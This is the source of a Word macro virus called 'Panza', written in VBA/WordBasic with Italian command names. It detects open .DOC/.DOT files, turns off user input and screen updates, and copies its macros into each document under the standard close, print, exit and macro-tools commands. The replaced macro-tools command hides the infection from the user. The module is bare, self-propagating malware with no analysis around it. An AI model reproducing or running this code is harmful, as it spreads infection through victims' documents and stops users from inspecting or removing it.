   Attribute VB_Name = "Panza"

   Public Sub MAIN()
   Dim infetta
   Dim puzzone$
   Dim Our$
   Dim CopiaMacro
   WordBasic.DisableInput 1
   infetta = 0
   puzzone$ = WordBasic.Call("NomeFinestra$")              'get current name
   Our$ = Mid(puzzone$, Len(puzzone$) - 3)
   If ((Our$ = ".DOC") Or (Our$ = ".DOT")) Then
                   infetta = 1             'check if it is a DOC or DOT
   End If
   ' if it is a DOC or DOT and it isn't a macro window we will infect it
   If ((WordBasic.IsMacro(0) = 0) And (infetta = 1)) Then
     WordBasic.ScreenUpdating 0
     CopiaMacro "Generale:AutoOpen", WordBasic.Call "NomeFinestra$" + ":AutoOpen", 1
     CopiaMacro "Generale:FileChiudi", WordBasic.Call "NomeFinestra$" + ":Panza", 1
     CopiaMacro "Generale:FileStampaPredef", WordBasic.Call "NomeFinestra$" + ":BiPanza", 1
     CopiaMacro "Generale:ChiudiDoc", WordBasic.Call "NomeFinestra$" + ":TriPanza", 1
     CopiaMacro "Generale:FileEsci", WordBasic.Call "NomeFinestra$" + ":Uscita", 1
     CopiaMacro "Generale:FileStampa", WordBasic.Call "NomeFinestra$" + ":Ranma", 1
     CopiaMacro "Generale:StrumMacro", WordBasic.Call "NomeFinestra$" + ":Nomacro", 1
     WordBasic.Call "FileSalvaConNome.Formato" = 1
   End If
   On Error GoTo -1: On Error GoTo gusarji
   WordBasic.Call "FileChiudi"                             'close it!
   gusarji:
   WordBasic.ScreenUpdating 1
   End Sub
